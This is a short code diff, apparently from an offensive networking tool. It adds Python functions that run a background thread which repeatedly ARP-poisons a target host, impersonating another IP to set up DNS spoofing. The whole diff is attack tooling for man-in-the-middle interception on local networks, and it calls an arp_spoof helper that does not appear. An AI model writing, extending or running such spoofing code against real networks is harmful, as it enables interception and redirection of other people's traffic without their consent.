@@ -33,4 +33,18 @@ def start_arp_poison(cmd):
     arp_thread.daemon = True
     arp_thread.start()
 
+def start_arp_thread(target_ip, mac, spoofed_ip, count):
+    arp_thread = threading.Thread(target=arp_for_dns_spoof_loop, args=(target_ip, mac, spoofed_ip, count))
+    arp_thread.daemon = True
+    arp_thread.start()
+
+def arp_for_dns_spoof_loop(ip, mac, spoofed_ip, count):
+    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
+    i = 0
+    while i in range(count):
+        arp_spoof(ip, mac, spoofed_ip)
+        time.sleep(1)
+        i+=1
+    print("ARP Poison to %s complete" % ip)
+
 
